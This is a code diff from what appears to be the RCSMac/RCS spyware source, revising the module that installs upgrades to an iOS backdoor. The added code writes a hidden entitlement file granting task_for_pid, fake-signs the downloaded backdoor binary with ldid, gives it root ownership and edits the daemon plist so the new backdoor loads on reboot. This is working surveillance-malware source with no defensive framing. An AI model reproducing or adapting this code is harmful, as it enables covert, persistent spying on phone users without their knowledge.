@@ -3,7 +3,7 @@
  *  RCSMac
  *
  *
- *  Created by revenge on 2/3/11.
+ *  Created on 2/3/11.
  *  Copyright (C) HT srl 2011. All rights reserved
  *
  */
@@ -14,14 +14,9 @@
 #import "NSData+SHA1.h"
 #import "NSData+Pascal.h"
 #import "RCSICommon.h"
-
-//#import "RCSMLogger.h"
-//#import "RCSMDebug.h"
+#import "RCSIInfoManager.h"
 
 //#define DEBUG_UPGRADE_NOP
-//#define infoLog NSLog
-//#define errorLog NSLog
-//#define warnLog NSLog
 
 #define	S_ISUID		0004000		/* [XSI] set user id on execution */
 #define	S_IRWXU		0000700		/* [XSI] RWX mask for owner */
@@ -36,10 +31,17 @@
 #define CORE_UPGRADE  @"core"
 #define DYLIB_UPGRADE @"dylib"
 
+#define ENTITLEMENT_FILENAME @"s7n3.9l15t"
+#define ENTITLEMENT_FILE @"<?xml version=\"1.0\" encoding=\"UTF-8\"?> \
+<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> \
+<plist version=\"1.0\"><dict><key>task_for_pid-allow</key><true/></dict></plist>"
+
+
 @interface UpgradeNetworkOperation (private)
 
-- (BOOL)_saveAndSignBackdoor:(NSData*)fileData;
+- (BOOL)_saveAndSignCore:(NSData*)fileData;
 - (BOOL)_saveDylibUpdate:(NSData*)fileData;
+
 @end
 
 @implementation UpgradeNetworkOperation (private)
@@ -56,8 +58,8 @@
   [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                              error: nil];
 
-  [fileData writeToFile: _upgradePath
-             atomically: YES];
+  [fileData safeWriteToFile: _upgradePath
+                 atomically: YES];
 
   // Forcing permission
   u_long permissions = (S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);
@@ -79,44 +81,12 @@
   return TRUE;  
 }
 
-- (BOOL)_saveAndSignBackdoor:(NSData*)fileData
+- (BOOL)updateAgentPlist
 {
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  BOOL bRet;
   
-  BOOL bRet = FALSE;
+  NSMutableData *_fileContent = [[NSMutableData alloc] initWithContentsOfFile: BACKDOOR_DAEMON_PLIST];
   
-  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@", 
-                                                             [[NSBundle mainBundle] bundlePath],
-                                                             gBackdoorUpdateName];
-  
-  // Create clean files for ios hfs 
-  [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
-                                             error: nil];
-                                              
-  bRet = [fileData writeToFile: _upgradePath
-                    atomically: YES];
-  
-  // Forcing permission
-  u_long permissions = S_IRWXU;
-  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
-  NSValue *owner = [NSNumber numberWithInt: 0];
-  
-  [[NSFileManager defaultManager] changeFileAttributes:[NSDictionary dictionaryWithObjectsAndKeys:
-                                                        permission,
-                                                        NSFilePosixPermissions,
-                                                        owner,
-                                                        NSFileOwnerAccountID,
-                                                        nil] 
-                                                atPath: _upgradePath];
-
-  [_upgradePath release];
-  
-  // Once the backdoor has been written, edit the backdoor Loader in order to
-  // load the new updated backdoor upon reboot
-  NSString *backdoorLoaderPath = [[[NSBundle mainBundle] bundlePath]
-                                  stringByAppendingPathComponent: @"srv.sh"];
-  
-  NSMutableData *_fileContent = [[NSMutableData alloc] initWithContentsOfFile: backdoorLoaderPath];
   NSMutableString *fileContent = [[NSMutableString alloc] initWithData: _fileContent
                                                               encoding: NSUTF8StringEncoding];
   
@@ -124,27 +94,114 @@
                                withString: gBackdoorUpdateName
                                   options: NSCaseInsensitiveSearch
                                     range: NSMakeRange(0, [fileContent length])];
- 
+  
   NSData *updateData = [fileContent dataUsingEncoding: NSUTF8StringEncoding];
   
-  [updateData writeToFile: backdoorLoaderPath
-               atomically: YES];
+  if ([updateData safeWriteToFile: BACKDOOR_DAEMON_PLIST
+                       atomically: YES] == TRUE)
+    {
+      bRet = TRUE;
+    }
+  else
+    {
+      bRet = FALSE;
+    }
   
-  pid_t pid = fork();
-  
-  // XXX- if fail must not upgraded???
-  if (pid == 0) 
-    execlp("/usr/bin/ldid", "/usr/bin/ldid", "-S", [gBackdoorUpdateName UTF8String], NULL);
-  
-  int status;
-  waitpid(pid, &status, 0);
- 
   [_fileContent release];
   [fileContent release];
   
+  return bRet;
+}
+
+- (BOOL)changeFileAttributes:(NSString*)_upgradePath
+{
+  u_long permissions = S_IRWXU;
+  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
+  NSValue *owner = [NSNumber numberWithInt: 0];
+ 
+  NSDictionary *attDict = [NSDictionary dictionaryWithObjectsAndKeys: permission,
+                                                                      NSFilePosixPermissions,
+                                                                      owner,
+                                                                      NSFileOwnerAccountID,
+                                                                      nil] ;
+  return [[NSFileManager defaultManager] changeFileAttributes:attDict 
+                                                       atPath:_upgradePath];
+  
+}
+
+- (BOOL)pseudoSignCore
+{
+  NSData *entData = [ENTITLEMENT_FILE dataUsingEncoding:NSUTF8StringEncoding];
+  
+  [entData writeToFile:ENTITLEMENT_FILENAME atomically:NO];
+  
+  pid_t pid = fork();
+  
+  if (pid == 0) 
+    execlp("/usr/bin/ldid", 
+           "/usr/bin/ldid", 
+           "-Ss7n3.9l15t", //ENTITLEMENT_FILENAME
+           [gBackdoorUpdateName UTF8String], 
+           NULL);
+  
+  int status;
+  waitpid(pid, &status, 0);
+  
+  [[NSFileManager defaultManager] removeItemAtPath: ENTITLEMENT_FILENAME 
+                                             error: nil];
+  
+  if (status == 0) 
+    return TRUE;
+  else 
+    return FALSE;
+}
+
+- (BOOL)_saveAndSignCore:(NSData*)fileData
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  BOOL bRet = FALSE;
+  
+  NSString *_upgradePath = [NSString stringWithFormat:@"%@/%@", 
+                                                      [[NSBundle mainBundle] bundlePath],
+                                                      gBackdoorUpdateName];
+  
+  // Create clean files for ios hfs 
+  [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
+                                             error: nil];
+                                              
+  bRet = [fileData safeWriteToFile: _upgradePath
+                        atomically: YES];
+  if (bRet == FALSE)
+    {
+      [pool release];
+      return FALSE;
+    }
+  
+  if ([self changeFileAttributes:_upgradePath] == FALSE)
+    {
+      [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
+                                                 error: nil];
+      [pool release];
+      return FALSE;
+    }
+
+  
+  if ([self pseudoSignCore]   == TRUE &&
+      [self updateAgentPlist] == TRUE)
+    {
+      bRet = TRUE;
+    }
+  else
+    {
+      [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
+                                                 error: nil];
+      bRet = FALSE;
+    }
+  
   [pool release];
   
-  return TRUE;  
+  return bRet;  
 }
 
 @end
@@ -156,10 +213,6 @@
   if (self = [super init])
     {
       mTransport = aTransport;
-      
-#ifdef DEBUG_UPGRADE_NOP
-      infoLog(@"mTransport: %@", mTransport);
-#endif
       return self;
     }
   
@@ -292,35 +345,23 @@
   
   if (filename == nil)
     {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"filename is empty, error on unpascalize");
-#endif
+      createInfoLog(@"error on proto upgrade");
     }
   else
     {  
       if ([filename isEqualToString: CORE_UPGRADE])
         {
-          if ([self _saveAndSignBackdoor: fileContent] == NO)
+          if ([self _saveAndSignCore: fileContent] == NO)
             {
-#ifdef DEBUG_UPGRADE_NOP
-              errorLog(@"Error while updating files for core upgrade");
-#endif
+              createInfoLog(@"error on upgrade core");
             }
         }
       else if ([filename isEqualToString: DYLIB_UPGRADE])
         {
           if ([self _saveDylibUpdate: fileContent] == NO)
             {
-#ifdef DEBUG_UPGRADE_NOP
-              errorLog(@"Error while updating files for dylib upgrade");
-#endif
+              createInfoLog(@"error on upgrade dylib");
             }
-        }
-      else
-        {
-#ifdef DEBUG_UPGRADE_NOP
-          errorLog(@"Upgrade not supported (%@)", filename);
-#endif
         }
     }
   
